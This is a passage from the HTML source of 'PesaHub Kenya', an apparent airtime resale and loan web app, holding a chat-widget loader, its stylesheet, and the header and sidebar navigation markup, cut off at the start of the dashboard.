<!DOCTYPE html>
<html lang="en">
<!-- Brevo Conversations {literal} -->
<script>
    (function(d, w, c) {
        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        var s = d.createElement('script');
        s.async = true;
        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'BrevoConversations');
</script>
<!-- /Brevo Conversations {/literal} -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pesahub Kenya</title>
    <link rel="manifest" href="/manifest.json">
    <link rel="icon" type="image/png" href="/airtime-logo.png">
    <link rel="apple-touch-icon" href="/airtime-logo.png">
    <meta name="theme-color" content="#1a5f2a">
    <meta name="description" content="Buy and resell airtime in Kenya and  Get loans of about Ksh 15,000. Fast, reliable, and affordable.">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #1a5f2a;
            --primary-dark: #0d3d18;
            --primary-light: #2d8b42;
            --secondary: #f4a020;
            --accent: #e63946;
            --success: #28a745;
            --warning: #ffc107;
            --danger: #dc3545;
            --info: #17a2b8;
            --dark: #212529;
            --light: #f8f9fa;
            --white: #ffffff;
            --gray: #6c757d;
            --border: #dee2e6;
        }

        [data-theme="dark"] {
            --primary: #2d8b42;
            --primary-dark: #1a5f2a;
            --dark: #f8f9fa;
            --light: #1a1a2e;
            --white: #16213e;
            --gray: #adb5bd;
            --border: #3a3a5c;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--light);
            color: var(--dark);
            min-height: 100vh;
            transition: all 0.3s ease;
        }

        .balance-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.01);
            z-index: 999;
            display: none;
            pointer-events: none;
        }

        .balance-overlay.show {
            display: block;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
        }

        .loading-overlay.show { display: flex; }

        .loading-spinner-large {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top-color: #f4a020;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            color: white;
            font-size: 1.1rem;
            font-weight: 500;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        @keyframes bellShake {
            0%, 100% { transform: rotate(0); }
            10%, 30%, 50%, 70%, 90% { transform: rotate(-10deg); }
            20%, 40%, 60%, 80% { transform: rotate(10deg); }
        }
        
        @keyframes giftShake {
            0%, 100% { transform: rotate(0) scale(1); }
            15% { transform: rotate(-15deg) scale(1.1); }
            30% { transform: rotate(10deg) scale(1.15); }
            45% { transform: rotate(-10deg) scale(1.1); }
            60% { transform: rotate(8deg) scale(1.05); }
            75% { transform: rotate(-5deg) scale(1); }
        }
        
        .shake-gift {
            animation: giftShake 1.5s ease-in-out infinite;
            color: #f4a020;
        }
        
        .sell-airtime-menu {
            background: linear-gradient(135deg, rgba(244, 160, 32, 0.1), rgba(230, 126, 34, 0.1)) !important;
        }
        
        .notification-btn.has-notification i {
            animation: bellShake 0.8s ease-in-out infinite;
            color: #ffd700;
        }
        
        .notification-item.unread h5 {
            color: #ffd700;
            font-weight: 600;
        }
        
        .scrolling-text-container {
            background: linear-gradient(135deg, var(--secondary), #e67e22);
            overflow: hidden;
            padding: 10px 0;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        
        .scrolling-text {
            display: inline-block;
            white-space: nowrap;
            animation: scrollText 20s linear infinite;
            font-weight: 600;
            color: var(--dark);
        }
        
        @keyframes scrollText {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }
        
        .users-graph-card {
            background: var(--white);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }
        
        .graph-container {
            height: 200px;
            display: flex;
            align-items: flex-end;
            justify-content: space-around;
            gap: 10px;
            padding: 20px 10px 10px;
            background: var(--light);
            border-radius: 12px;
        }
        
        .graph-bar {
            flex: 1;
            background: linear-gradient(to top, var(--primary), var(--primary-light));
            border-radius: 8px 8px 0 0;
            position: relative;
            min-width: 30px;
            transition: height 0.5s ease;
        }
        
        .graph-bar span {
            position: absolute;
            bottom: -25px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0.7rem;
            color: var(--gray);
            white-space: nowrap;
        }
        
        .graph-bar::after {
            content: attr(data-value);
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--primary);
        }
        
        .profile-avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
            margin: 0 auto 20px;
            display: block;
            border: 4px solid var(--primary);
        }

        .app-container { max-width: 100%; min-height: 100vh; }

        .header {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: var(--white);
            padding: 15px 20px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 15px rgba(0,0,0,0.2);
        }

        .header-left { display: flex; align-items: center; gap: 15px; }
        .menu-btn { background: none; border: none; color: var(--white); font-size: 1.5rem; cursor: pointer; padding: 5px; }
        .logo { display: flex; align-items: center; gap: 10px; }
        .logo img { width: 40px; height: 40px; border-radius: 50%; }
        .logo-text { font-weight: 600; font-size: 1.1rem; color: #f0f0f0; }
        .header-right { display: flex; align-items: center; gap: 15px; }

        .notification-btn {
            background: none;
            border: none;
            color: var(--white);
            font-size: 1.3rem;
            cursor: pointer;
            position: relative;
        }

        .notification-badge {
            position: absolute;
            top: -5px;
            right: -5px;
            background: var(--accent);
            color: white;
            font-size: 0.7rem;
            padding: 2px 6px;
            border-radius: 50%;
            font-weight: 600;
        }

        .user-balance {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,255,255,0.15);
            padding: 8px 15px;
            border-radius: 25px;
        }

        .balance-amount { font-weight: 700; color: var(--secondary); }

        .refresh-btn {
            background: none;
            border: none;
            color: var(--white);
            cursor: pointer;
            font-size: 0.9rem;
            transition: transform 0.3s;
        }

        .refresh-btn:hover { transform: rotate(180deg); }
        .refresh-btn.spinning { animation: spin 1s linear infinite; }

        .sidebar {
            position: fixed;
            top: 0;
            left: -280px;
            width: 280px;
            height: 100vh;
            background: var(--white);
            z-index: 2000;
            transition: left 0.3s ease;
            box-shadow: 5px 0 20px rgba(0,0,0,0.1);
            overflow-y: auto;
        }

        .sidebar.open { left: 0; }

        .sidebar-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 1999;
            display: none;
        }

        .sidebar-overlay.show { display: block; }

        .sidebar-header {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: var(--white);
            padding: 25px 20px;
        }

        .sidebar-user { display: flex; align-items: center; gap: 15px; }

        .user-avatar {
            width: 50px;
            height: 50px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }

        .user-info h3 { font-weight: 600; font-size: 1rem; }
        .user-info p { font-size: 0.85rem; opacity: 0.8; }
        .sidebar-menu { padding: 20px 0; }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px 25px;
            color: var(--dark);
            text-decoration: none;
            transition: all 0.3s;
            cursor: pointer;
            border: none;
            background: none;
            width: 100%;
            font-family: inherit;
            font-size: 0.95rem;
        }

        .menu-item:hover, .menu-item.active {
            background: rgba(26, 95, 42, 0.1);
            color: var(--primary);
            border-left: 4px solid var(--primary);
            padding-left: 21px;
        }

        .menu-item span.menu-text {
            position: relative;
        }

        .menu-item.active span.menu-text::after,
        .menu-item:hover span.menu-text::after {
            content: '';
            position: absolute;
            bottom: -4px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, var(--primary), var(--primary-light));
            border-radius: 2px;
        }

        .menu-item i { width: 25px; text-align: center; }
        .menu-divider { height: 1px; background: var(--border); margin: 15px 20px; }
        .main-content { padding-top: 70px; padding-bottom: 20px; min-height: 100vh; }

        .page {
            display: none;
            padding: 0;
            animation: fadeIn 0.4s ease;
        }
        
        .page-content {
            padding: 0 20px 20px 20px;
        }

        .page.active { display: block; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .hero-section {
            background: url('airtime-hero-bg.png') center center / cover no-repeat;
            border-radius: 0;
            padding: 20px;
            margin: 0 0 20px 0;
            position: relative;
        }

        .hero-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 0;
            z-index: 0;
        }

        .hero-section > * {
            position: relative;
            z-index: 1;
        }

        .card {
            background: var(--white);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }

        .card-title {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--primary);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .balance-card {
            background: linear-gradient(145deg, var(--primary) 0%, var(--primary-dark) 50%, #0a2d12 100%);
            color: var(--white);
            text-align: center;
            padding: 35px 25px;
            border-radius: 24px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(26, 95, 42, 0.25);
        }

        .balance-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            pointer-events: none;
        }

        .balance-card::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--secondary), #e67e22, var(--secondary));
        }

        .balance-label { 
            font-size: 0.95rem; 
            opacity: 0.95; 
            margin-bottom: 8px;
            font-weight: 400;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .balance-value { 
            font-size: 1.8rem; 
            font-weight: 700; 
            text-shadow: 0 2px 8px rgba(0,0,0,0.2);
            letter-spacing: 0.5px;
            margin: 8px 0;
        }

        .balance-bonus { 
            color: var(--secondary); 
            font-size: 0.9rem; 
            margin-top: 12px;
            background: rgba(244, 160, 32, 0.15);
            padding: 10px 18px;
            border-radius: 30px;
            display: inline-block;
            font-weight: 500;
            border: 1px solid rgba(244, 160, 32, 0.3);
        }

        .balance-bonus i {
            animation: giftShake 1.5s ease-in-out infinite;
            margin-right: 6px;
        }

        .quick-actions { 
            display: flex;
            flex-direction: column;
            gap: 12px; 
            margin-top: 20px; 
        }

        .quick-actions-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 20px;
        }

        .action-card {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 25px 15px;
            background: rgba(13, 61, 24, 0.85);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            color: var(--white);
            gap: 12px;
            font-family: inherit;
        }

        .action-card i {
            font-size: 1.8rem;
            color: var(--secondary);
        }

        .action-card span {
            font-size: 0.95rem;
            font-weight: 600;
            color: var(--white);
        }

        .action-card:hover {
            background: rgba(13, 61, 24, 0.95);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            border-color: rgba(244, 160, 32, 0.3);
        }

        .action-card:active {
            transform: translateY(0) scale(0.98);
        }

        .action-btn {
            display: flex;
            flex-direction: row;
            align-items: center;
            gap: 16px;
            padding: 18px 22px;
            background: var(--white);
            border: none;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
            color: var(--dark);
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            position: relative;
            overflow: hidden;
        }

        .action-btn::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 4px;
            background: linear-gradient(180deg, var(--primary), var(--primary-light));
            opacity: 0;
            transition: opacity 0.3s;
        }

        .action-btn:hover::before {
            opacity: 1;
        }

        .action-btn:hover {
            transform: translateX(5px);
            box-shadow: 0 8px 25px rgba(26,95,42,0.18);
            background: linear-gradient(90deg, rgba(26, 95, 42, 0.03), var(--white));
        }

        .action-btn:active {
            transform: translateX(2px) scale(0.98);
        }

        .action-btn i { 
            font-size: 1.5rem; 
            color: var(--primary);
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(26, 95, 42, 0.1), rgba(45, 139, 66, 0.1));
            border-radius: 14px;
            flex-shrink: 0;
        }

        .action-btn span { 
            font-weight: 600; 
            font-size: 1rem;
            color: var(--dark);
        }

        .action-btn .action-arrow {
            margin-left: auto;
            color: var(--gray);
            font-size: 1rem;
            transition: transform 0.3s, color 0.3s;
        }

        .action-btn:hover .action-arrow {
            transform: translateX(5px);
            color: var(--primary);
        }
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--dark); }
        .form-label i { color: var(--primary); margin-right: 8px; }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid var(--border);
            border-radius: 12px;
            font-size: 1rem;
            font-family: inherit;
            background: var(--white);
            color: var(--dark);
            transition: all 0.3s;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26,95,42,0.1);
        }

        .phone-wrapper { display: flex; }

        .phone-prefix {
            background: var(--light);
            padding: 14px 15px;
            border: 2px solid var(--border);
            border-right: none;
            border-radius: 12px 0 0 12px;
            font-weight: 500;
            color: var(--dark);
        }

        .phone-wrapper .form-input { border-radius: 0 12px 12px 0; }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 14px 24px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            width: 100%;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-light));
            color: var(--white);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(26,95,42,0.3);
        }

        .btn-secondary { background: var(--secondary); color: var(--dark); }
        .btn-outline { background: transparent; border: 2px solid var(--primary); color: var(--primary); }
        .btn-outline:hover { background: var(--primary); color: var(--white); }
        .btn-link { background: #0066cc; color: var(--white); }
        .btn-link:hover { background: #0052a3; }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }

        .btn .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid transparent;
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .divider-text {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: var(--gray);
            font-size: 0.85rem;
        }

        .divider-text::before, .divider-text::after { content: ''; flex: 1; height: 1px; background: var(--border); }
        .divider-text span { padding: 0 15px; }

        .info-box {
            background: rgba(26, 95, 42, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 4px solid var(--primary);
        }

        .info-box p { font-size: 0.9rem; color: var(--dark); }

        /* Network Selector Styles */
        .network-selector {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            justify-content: center;
        }

        .network-option {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px;
            border: 3px solid var(--border);
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            background: var(--white);
            min-width: 90px;
        }

        .network-option:hover {
            border-color: var(--primary-light);
            transform: translateY(-2px);
        }

        .network-option.selected {
            border-color: var(--primary);
            background: rgba(26, 95, 42, 0.1);
            box-shadow: 0 0 0 3px rgba(26, 95, 42, 0.2);
        }

        .network-option img {
            width: 50px;
            height: 50px;
            object-fit: contain;
            margin-bottom: 8px;
        }

        .network-option span {
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--dark);
        }

        .validation-error {
            color: var(--danger);
            font-size: 0.8rem;
            margin-top: 5px;
            display: none;
        }

        .validation-error.show {
            display: block;
        }

        .form-input.valid {
            border-color: var(--success);
        }

        .form-input.invalid {
            border-color: var(--danger);
        }

        .network-error {
            color: var(--danger);
            font-size: 0.85rem;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }

        .network-error.show {
            display: block;
        }

        .transaction-list { max-height: 400px; overflow-y: auto; }

        .transaction-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid var(--border);
            transition: background 0.2s;
        }

        .transaction-item:hover { background: var(--light); }
        .transaction-item:last-child { border-bottom: none; }
        .transaction-info { display: flex; align-items: center; gap: 12px; }

        .transaction-icon {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
        }

        .transaction-icon.deposit { background: rgba(40, 167, 69, 0.15); color: var(--success); }
        .transaction-icon.airtime { background: rgba(23, 162, 184, 0.15); color: var(--info); }
        .transaction-icon.failed { background: rgba(220, 53, 69, 0.15); color: var(--danger); }
        .transaction-icon.pending { background: rgba(255, 193, 7, 0.15); color: var(--warning); }
        .transaction-details h4 { font-size: 0.95rem; font-weight: 500; margin-bottom: 3px; }
        .transaction-details p { font-size: 0.8rem; color: var(--gray); }
        .transaction-amount { text-align: right; }
        .transaction-amount .amount { font-weight: 600; font-size: 1rem; }
        .transaction-amount .bonus { color: var(--success); font-size: 0.8rem; }
        .transaction-amount .status { font-size: 0.75rem; padding: 3px 8px; border-radius: 20px; }
        .status-completed { background: rgba(40, 167, 69, 0.15); color: var(--success); }
        .status-pending { background: rgba(255, 193, 7, 0.15); color: #856404; }
        .status-failed { background: rgba(220, 53, 69, 0.15); color: var(--danger); }

        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.6);
            z-index: 3000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal.show { display: flex; }

        .modal-content {
            background: var(--white);
            border-radius: 20px;
            width: 100%;
            max-width: 450px;
            max-height: 90vh;
            overflow-y: auto;
            animation: modalSlide 0.3s ease;
        }

        @keyframes modalSlide {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .modal-header {
            padding: 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-header h3 { font-size: 1.2rem; font-weight: 600; color: var(--primary); }
        .modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--gray); }
        .modal-body { padding: 20px; }
        .modal-footer { padding: 15px 20px; border-top: 1px solid var(--border); display: flex; gap: 10px; }

        .notification-panel {
            position: fixed;
            top: 70px;
            right: 10px;
            width: 320px;
            max-height: 400px;
            background: var(--white);
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            z-index: 2500;
            display: none;
            overflow: hidden;
        }

        .notification-panel.show { display: block; animation: slideDown 0.3s ease; }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .notification-header {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .notification-header h4 { font-weight: 600; color: var(--primary); }
        .notification-list { max-height: 300px; overflow-y: auto; }

        .notification-item {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border);
            cursor: pointer;
            transition: background 0.2s;
            background: rgba(26, 95, 42, 0.08);
        }

        .notification-item:hover { background: rgba(26, 95, 42, 0.15); }
        .notification-item.unread { background: rgba(26, 95, 42, 0.18); }
        .notification-item h5 { font-size: 0.9rem; font-weight: 500; margin-bottom: 5px; }
        .notification-item p { font-size: 0.8rem; color: var(--gray); }
        .notification-item .time { font-size: 0.75rem; color: var(--gray); margin-top: 5px; }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--dark);
            color: var(--white);
            padding: 15px 25px;
            border-radius: 12px;
            z-index: 4000;
            display: none;
            animation: toastSlide 0.3s ease;
            max-width: 90%;
        }

        .toast.show { display: flex; align-items: center; gap: 10px; }

        @keyframes toastSlide {
            from { opacity: 0; transform: translate(-50%, 20px); }
            to { opacity: 1; transform: translate(-50%, 0); }
        }

        .toast.success { background: var(--success); }
        .toast.error { background: var(--danger); }
        .toast.info { background: var(--info); }
        .toast.delay { background: #6c5ce7; }
        .toast.cancel { background: #e74c3c; }

        .retry-btn {
            display: none;
            margin-top: 15px;
            padding: 12px 20px;
            background: linear-gradient(135deg, var(--warning), #e67e22);
            color: var(--dark);
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
        }

        .retry-btn.show { display: flex; }
        .retry-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(230, 126, 34, 0.3); }

        .status-cancelled { background: rgba(220, 53, 69, 0.15); color: var(--danger); }
        .status-delay { background: rgba(108, 92, 231, 0.15); color: #6c5ce7; }

        .live-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            margin-right: 5px;
            animation: livePulse 1.5s ease-in-out infinite;
        }

        @keyframes livePulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }

        .coming-soon-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 16px;
        }

        .coming-soon-badge {
            background: linear-gradient(135deg, var(--secondary), #e67e22);
            color: var(--white);
            padding: 15px 30px;
            border-radius: 30px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 5px 20px rgba(244,160,32,0.4);
        }

        .rate-display {
            text-align: center;
            padding: 20px;
            background: var(--light);
            border-radius: 12px;
            margin-bottom: 20px;
        }

        .rate-display .rate {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
        }

        .dial-code {
            background: var(--dark);
            color: var(--white);
            padding: 15px;
            border-radius: 10px;
            font-family: monospace;
            font-size: 1.2rem;
            text-align: center;
            margin-bottom: 15px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: var(--white);
            padding: 20px;
            border-radius: 16px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }

        .stat-card i { font-size: 2rem; color: var(--primary); margin-bottom: 10px; }
        .stat-card .value { font-size: 1.5rem; font-weight: 700; color: var(--dark); }
        .stat-card .label { font-size: 0.85rem; color: var(--gray); }

        .admin-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .admin-tab {
            padding: 10px 20px;
            border: none;
            background: var(--light);
            border-radius: 10px;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.3s;
        }

        .admin-tab.active { background: var(--primary); color: white; }
        .table-responsive { overflow-x: auto; }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
        }

        .data-table th, .data-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }

        .data-table th { background: var(--light); font-weight: 600; }

        .empty-state { text-align: center; padding: 40px 20px; color: var(--gray); }
        .empty-state i { font-size: 4rem; margin-bottom: 15px; opacity: 0.5; }
        .empty-state h3 { font-size: 1.2rem; margin-bottom: 10px; }
        .empty-state p { font-size: 0.9rem; }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
            flex-wrap: wrap;
        }

        .footer-link {
            color: var(--gray);
            font-size: 0.85rem;
            cursor: pointer;
        }

        .footer-link:hover { color: var(--primary); }

        .pwa-install {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 10px;
            background: #000000;
            color: var(--white);
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            cursor: pointer;
            border: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            margin-top: 20px;
        }

        .pwa-install p {
            color: #ffffff;
            font-size: 0.9rem;
            margin: 0;
        }

        @media (max-width: 480px) {
            .header { padding: 12px 15px; }
            .logo-text { font-size: 0.9rem; }
            .quick-actions { flex-direction: column; gap: 10px; }
            .action-btn { padding: 15px 18px; }
            .action-btn i:first-child { width: 44px; height: 44px; font-size: 1.3rem; }
            .balance-value { font-size: 1.6rem; }
            .notification-panel { right: 5px; left: 5px; width: auto; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }

        

    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner-large"></div>
        <div class="loading-text" id="loadingText">Loading...</div>
    </div>

    <div class="balance-overlay" id="balanceOverlay"></div>

    <div class="app-container">
        <header class="header">
            <div class="header-left">
                <button class="menu-btn" onclick="toggleSidebar()">
                    <i class="fas fa-bars"></i>
                </button>
                <div class="logo">
                    <img src="company-logo.png" alt="Logo" id="headerLogo">
                    <span class="logo-text">PesaHub Kenya</span>
                </div>
            </div>
            <div class="header-right">
                <div class="user-balance">
                    <span>KES</span>
                    <span class="balance-amount" id="headerBalance">0.00</span>
                    <button class="refresh-btn" onclick="refreshBalance()" id="refreshBtn">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                </div>
                <button class="notification-btn" onclick="toggleNotifications()">
                    <i class="fas fa-bell"></i>
                    <span class="notification-badge" id="notifBadge">0</span>
                </button>
            </div>
        </header>

        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        <nav class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <div class="sidebar-user">
                    <div class="user-avatar">
                        <i class="fas fa-user"></i>
                    </div>
                    <div class="user-info">
                        <h3 id="sidebarEmail">Guest</h3>
                        <p id="sidebarBalance">KES 0.00</p>
                    </div>
                </div>
            </div>
            <div class="sidebar-menu">
                <button class="menu-item active" onclick="showPage('dashboard')">
                    <i class="fas fa-home"></i> <span class="menu-text">Dashboard</span>
                </button>
                <button class="menu-item" onclick="showPage('deposit')">
                    <i class="fas fa-wallet"></i> <span class="menu-text">Deposit Float</span>
                </button>
                <button class="menu-item" onclick="showPage('buy-airtime')">
                    <i class="fas fa-mobile-alt"></i> <span class="menu-text">Buy Airtime</span>
                </button>
                <button class="menu-item" onclick="showPage('sell-airtime')">
                    <i class="fas fa-gift"></i> <span class="menu-text">Sell Airtime Get Commission</span>
                </button>
                <button class="menu-item" onclick="showPage('airtime-to-cash')">
                    <i class="fas fa-exchange-alt"></i> <span class="menu-text">Airtime to Cash</span>
                </button>
                <button class="menu-item" onclick="closeSidebar(); scrollToDirectBuy();">
                    <i class="fas fa-bolt"></i> <span class="menu-text">Buy Airtime without account</span>
                </button>
                <button class="menu-item" onclick="showPage('transactions')">
                    <i class="fas fa-history"></i> <span class="menu-text">Transactions</span>
                </button>
                <button class="menu-item" onclick="showPage('verify-deposit')">
                    <i class="fas fa-check-circle"></i> <span class="menu-text">Verify Deposit</span>
                </button>
                <button class="menu-item loan-feature" onclick="openLoanTerms()" style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.1), rgba(39, 174, 96, 0.1));">
                    <i class="fas fa-hand-holding-usd" style="color: #27ae60;"></i> <span class="menu-text">Get A Loan Today</span>
                </button>
                <div class="menu-divider"></div>
                <button class="menu-item" onclick="showPage('bulk-sms')">
                    <i class="fas fa-sms"></i> <span class="menu-text">Bulk SMS</span>
                </button>
                <div class="menu-divider"></div>
                <button class="menu-item" onclick="showPage('settings')">
                    <i class="fas fa-cog"></i> <span class="menu-text">Settings</span>
                </button>
                <button class="menu-item" onclick="showPage('about')">
                    <i class="fas fa-info-circle"></i> <span class="menu-text">About Us</span>
                </button>
                <button class="menu-item" onclick="showPage('contact')">
                    <i class="fas fa-envelope"></i> <span class="menu-text">Contact Us</span>
                </button>
                <button class="menu-item" onclick="showPage('privacy')">
                    <i class="fas fa-shield-alt"></i> <span class="menu-text">Privacy Policy</span>
                </button>
                <button class="menu-item" onclick="showPage('terms')">
                    <i class="fas fa-file-contract"></i> <span class="menu-text">Terms of Service</span>
                </button>
                <button class="menu-item" onclick="showPage('cookies')">
                    <i class="fas fa-cookie-bite"></i> <span class="menu-text">Cookie Policy</span>
                </button>
                <div class="menu-divider"></div>
                <button class="menu-item" onclick="showPage('admin')">
                    <i class="fas fa-user-shield"></i> <span class="menu-text">Merchant Dashboard</span>
                </button>
                <button class="menu-item" onclick="logout()" style="color: var(--danger);">
                    <i class="fas fa-sign-out-alt"></i> <span class="menu-text">Logout</span>
                </button>
            </div>
        </nav>

        <main class="main-content">
            <div id="page-dashboard" class="page active">
                <div class="hero-section" style="padding-top: 0;">
